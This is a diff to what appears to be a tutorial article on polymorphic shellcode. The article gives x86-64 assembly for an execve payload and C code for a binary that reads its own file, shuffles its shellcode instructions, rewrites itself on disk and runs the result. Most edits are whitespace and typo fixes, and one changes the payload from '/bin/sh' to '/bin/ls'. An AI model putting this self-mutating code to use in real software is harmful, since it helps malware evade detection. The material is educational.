@@ -14,7 +14,7 @@ can "re-code" themselves. The general behavior will be the normally the same, bu
 The idea is to make the code flexible:
 * it can be done for example by injecting NOP sleds (as we usually do regarding buffer overflows) between instructions. We have therefore to be able to split instructions (to decode them)
 and to pay attention to relative jumps...
-* instead of NOP sleds, we can also inject useless instructions (push/pop of the same register, AND against 0xff...ff, double swap, etc.) 
+* instead of NOP sleds, we can also inject useless instructions (push/pop of the same register, AND against 0xff...ff, double swap, etc.)
 * it's also possible to swap registers, and therefore, we have to keep the code consistent
 * we can also reorder instructions
 
@@ -74,11 +74,11 @@ that we cannot put the constant strings at the end of the shellcode or in the .d
 >	push rdi					; save rdi
 >	push rsi					; save rsi
 >	push 0x006c2d				; push "-l"
->	push 0x736c2f				; push "/sh"
+>	push 0x736c2f				; push "/ls"
 >	sub rsp, 4					; don't use push here
 >	mov dword [rsp], 0x6e69622f ;move "/bin" onto the stack
 >	push 0x0					; push null element
->	lea rdi, [rsp+20]			; rdi = address of the argument 
+>	lea rdi, [rsp+20]			; rdi = address of the argument
 >	push rdi					; push it
 >	lea rdi, [rsp+16]			; rdi = address of the command
 >	push rdi					; push it
@@ -92,8 +92,8 @@ that we cannot put the constant strings at the end of the shellcode or in the .d
 >	pop rdx						; restore rdx
 > ```
 
-The register `$rsi` contains the address of an array containing the addresses of the command and its parameters, here: \[@"/bin/sh", @"-l"\]. That's the reason why we put the addresses of these strings
-(instructions 10 and 12). The string "/bin/sh" cannot be pushed as an int, that's the reason why we do it in two times, and manually modify `$rsp`.
+The register `$rsi` contains the address of an array containing the addresses of the command and its parameters, here: \[@"/bin/ls", @"-l"\]. That's the reason why we put the addresses of these strings
+(instructions 10 and 12). The string "/bin/ls" cannot be pushed as an int, that's the reason why we do it in two times, and manually modify `$rsp`.
 
 To make it flexible, we simply have to put `jmp $+2` between instructions ( `jmp $+2` is translated into `eb 00`, which is a null jump):
 
@@ -111,7 +111,7 @@ _start:
 >	jmp $+2
 >	push 0x006c2d				; push "-l"
 >	jmp $+2
->	push 0x736c2f				; push "/sh"
+>	push 0x736c2f				; push "/ls"
 >	jmp $+2
 >	sub rsp, 4					; don't use push here
 >	jmp $+2
@@ -176,7 +176,7 @@ We use the following structure to store the shellcode instructions:
 
 > ```c
 >typedef struct Instr_struct{
->	char* i_code;		//shellcode "chunk". Points somewhere the string $shellcode
+>	char* i_code;		//shellcode "chunk". Points somewhere in the string $shellcode
 >	char  i_code_len;	//length of the instruction
 >	char  i_index;		//execution index
 >	char  i_jump;		//jump to reach next instruction
@@ -194,26 +194,26 @@ is executed, after granting the execution permission to the memory page.
 
 > ```c
 >int main(int argc, char** argv){
->	char* data; 
->	struct stat info; 
+>	char* data;
+>	struct stat info;
 >	int fd;
->	
+>
 >	/** Reads itself **/
->	if ((fd = open(argv[0], O_RDONLY, 0)) < 0) die(NULL, "Could not read myself\n"); 
->	fstat(fd, &info); 
->	if (!(data = malloc(info.st_size))) die(data, "Could not allocate memory\n"); 
->	read(fd, data, info.st_size); 
->	close(fd); 
->	
+>	if ((fd = open(argv[0], O_RDONLY, 0)) < 0) die(NULL, "Could not read myself\n");
+>	fstat(fd, &info);
+>	if (!(data = malloc(info.st_size))) die(data, "Could not allocate memory\n");
+>	read(fd, data, info.st_size);
+>	close(fd);
+>
 >	mutate(data);
->	
+>
 >	/** Overwrites itself **/
->	if (unlink(argv[0]) < 0) die(data, "Could not unlink myself\n"); 
->	if ((fd = open(argv[0], O_CREAT|O_TRUNC|O_RDWR, S_IRWXU)) < 0) die(data, "Could not re-create myself\n"); 
->	if (write(fd, data, info.st_size) < 0) die(data, "Could not re-write myself\n"); 
+>	if (unlink(argv[0]) < 0) die(data, "Could not unlink myself\n");
+>	if ((fd = open(argv[0], O_CREAT|O_TRUNC|O_RDWR, S_IRWXU)) < 0) die(data, "Could not re-create myself\n");
+>	if (write(fd, data, info.st_size) < 0) die(data, "Could not re-write myself\n");
 >	close(fd);
 >	free(data);
->	
+>
 >	/** Execute shellcode **/
 >	uintptr_t pagestart	 = (uintptr_t)shellcode & -getpagesize();
 >	if (mprotect((void*)pagestart, ((uintptr_t)shellcode + SHELLCODE_SIZE - pagestart), PROT_READ | PROT_WRITE | PROT_EXEC) < 0)
@@ -222,9 +222,9 @@ is executed, after granting the execution permission to the memory page.
 >}
 >
 >void die(char* p_data, char* p_msg){
->	if (p_data) free(p_data); 
->	fprintf(stderr, p_msg, NULL); 
->	exit(EXIT_FAILURE); 
+>	if (p_data) free(p_data);
+>	fprintf(stderr, p_msg, NULL);
+>	exit(EXIT_FAILURE);
 >}
 > ```
 
@@ -232,8 +232,8 @@ The `die` routine is used only for debugging purpose, as it simply prints a mess
 
 ## Helpers
 
-The routine `mutate` is the most complicated, that's the reason why the some helpers have been written to make it easier to understand. The first one is based on the one given [here](https://0x00sec.org/t/elfun-file-injector/410)
-or the one we used in [the previous article](./polymorphic1). It reads the data as an ELF header and finds the offset of the .data section. 
+The routine `mutate` is the most complicated, that's the reason why some helpers have been written to make it easier to understand. The first one is based on the one given [here](https://0x00sec.org/t/elfun-file-injector/410)
+or the one we used in [the previous article](./polymorphic1). It reads the data as an ELF header and finds the offset of the .data section.
 
 > ```c
 >Elf64_Shdr* get_section(void* p_data){
@@ -252,7 +252,7 @@ We also created a routine named `split_instructions`, which ... splits instructi
 
 > ```c
 >Instr** split_instructions(char* p_data, int p_nb_instrs){
->	Instr** instrs = malloc(p_nb_instrs * sizeof(Instr*));	
+>	Instr** instrs = malloc(p_nb_instrs * sizeof(Instr*));
 >	int i, j;
 >	unsigned char k;
 >	for (i = 0; i < p_nb_instrs; i++){
@@ -268,7 +268,7 @@ We also created a routine named `split_instructions`, which ... splits instructi
 >		instrs[i]->i_code = &shellcode[j];
 >		instrs[i]->i_index = i;
 >		instrs[i]->i_jump = (char)shellcode[k + 1];
->		j = k + instrs[i]->i_jump + 2 ; //jumps to next instruction TO EXECUTE 
+>		j = k + instrs[i]->i_jump + 2 ; //jumps to next instruction TO EXECUTE
 >	}
 >	return instrs;
 >}
@@ -292,14 +292,14 @@ The goal of the mutation routine is to walk through the shuffled code, shuffle i
 >	unsigned char count;
 >	char* cursor = malloc(SHELLCODE_SIZE);
 >	Instr* instr = NULL;
->	
+>
 >	/** Count how many jumps there are **/
 >	for (i = 0; i < SHELLCODE_SIZE; i++){
 >		if (shellcode[i] == 0xeb) nb_instr++;
 >	}
 >	nb_instr--;
->	
->	//instrs: array containing all "useful" instructions, in the right order 
+>
+>	//instrs: array containing all "useful" instructions, in the right order
 >	Instr** instrs = split_instructions(p_data, nb_instr);
 >	...
 > ```
@@ -318,9 +318,9 @@ to have a way to know where is stored the next instruction to execute, for each 
 
 It's now time to shuffle the array and update `instrs_idx` to be able to know where is stored the pointer of the i-th instruction in `instrs`.
 
-## Shuffle 
+## Shuffle
 
-We are still in `mutate`, juste after the previous snippet. The `while` condition will be detailed later. The idea here is to swap pointers in `instrs`, and update `instrs_idx` properly. 
+We are still in `mutate`, juste after the previous snippet. The `while` condition will be detailed later. The idea here is to swap pointers in `instrs`, and update `instrs_idx` properly.
 
 > ```c
 >	...
@@ -336,7 +336,7 @@ We are still in `mutate`, juste after the previous snippet. The `while` conditio
 >			int idx = instrs_idx[instrs[i]->i_index];
 >			instrs_idx[instrs[i]->i_index] = instrs_idx[instrs[j]->i_index];
 >			instrs_idx[instrs[j]->i_index] = idx;
->		}	
+>		}
 >	}
 >	while((count = set_jumps(instrs, instrs_idx, nb_instr)) == 0xff); //if all offsets are okay, continue
 >	...
@@ -354,7 +354,7 @@ We cannot simply swap indexes in `instrs_idx`, because it would be totally wrong
 >              +-----+-----+-----+-----+-----+
 > ```
 
-Indeed, in order to build the new shellcode correctly we have to execute the instruction in this order: `instrs\[2\]`, `instrs\[4\]`, `instrs\[1\]`, `instrs\[0\]`, and `instrs\[3\]`.
+Indeed, in order to build the new shellcode correctly we have to execute the instruction in this order: `instrs[2]`, `instrs[4]`, `instrs[1]`, `instrs[0]`, and `instrs[3]`.
 However, if we want to swap instruction at `i = 1, j = 2` it will give us:
 
 > ```
@@ -371,7 +371,7 @@ but `instrs_idx` will NOT become:
 > +-----+-----+-----+-----+-----+
 > ```
 
-What we need to do is to use the `i_index`, represented here by the number in `instrX` to swap values in `instrs_idx`: we do not swap `instrs_idx\[1\]` and `instrs_idx\[2\]`, but `instrs_idx\[0\]` and `instrs_idx\[2\]`:
+What we need to do is to use the `i_index`, represented here by the number in `instrX` to swap values in `instrs_idx`: we do not swap `instrs_idx[1]` and `instrs_idx[2]`, but `instrs_idx[0]` and `instrs_idx[2]`:
 
 > ```
 > instrs_idx = +-----+-----+-----+-----+-----+
@@ -389,12 +389,12 @@ We created another routine to compute jumps, in order to be able to call it as l
 >int set_jumps(Instr** p_instrs, int* p_instrs_idx, int p_nb_instrs){
 >	int i, j, idx, idx1;
 >	unsigned char count;
->	
+>
 >	/** Set jumps BETWEEN "useful" instructions**/
 >	for (i = 0; i < p_nb_instrs -1; i++){
 >		count = 0;
 >		idx = p_instrs_idx[i];		//index of the current instruction in shuffled array
->		idx1 = p_instrs_idx[i+1];	//index next instruction (to execute) in shuffled array 
+>		idx1 = p_instrs_idx[i+1];	//index next instruction (to execute) in shuffled array
 >		if (idx1 > idx){
 >			//move forward
 >			//start from the NEXT instruction IN THE ARRAY before reaching the next instruction TO EXECUTE
@@ -410,8 +410,8 @@ We created another routine to compute jumps, in order to be able to call it as l
 >		p_instrs[idx]->i_jump = count;
 >		if (count == 0xeb) return -1; //if the jump is equal to 0xeb (also jmp's opcode), return -1
 >	}
->	
->	/** Set initial jump (reach the first "useful" instruction) **/ 
+>
+>	/** Set initial jump (reach the first "useful" instruction) **/
 >	count = 0;
 >	for (i = 0; i < p_nb_instrs && i < p_instrs_idx[0]; i++) //instrs_idx[0] contains the index in the shuffled array of the first instruction to execute
 >		count += 2 + p_instrs[i]->i_code_len;
@@ -555,7 +555,7 @@ It actually starts at 0x202020, 32 bytes after the beginning. Hence, we have
 >	Elf64_Shdr *sec_hdr;
 >	if ((sec_hdr = get_section(p_data)))
 >		memcpy(p_data+sec_hdr->sh_offset + 0x20, cursor, SHELLCODE_SIZE);
->	
+>
 >	/** Destroy instructions **/
 >	for (i = 0; i < nb_instr; i++)
 >		free(instrs[i]);
